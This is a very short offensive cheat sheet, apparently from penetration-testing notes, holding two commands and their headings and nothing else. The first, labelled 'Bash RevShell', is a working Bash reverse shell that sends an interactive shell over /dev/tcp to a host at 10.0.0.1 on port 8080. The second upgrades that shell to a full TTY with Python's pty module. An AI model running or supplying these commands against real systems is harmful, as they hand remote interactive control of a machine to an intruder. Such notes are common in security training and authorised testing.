Bash RevShell
```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

Python TTY
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

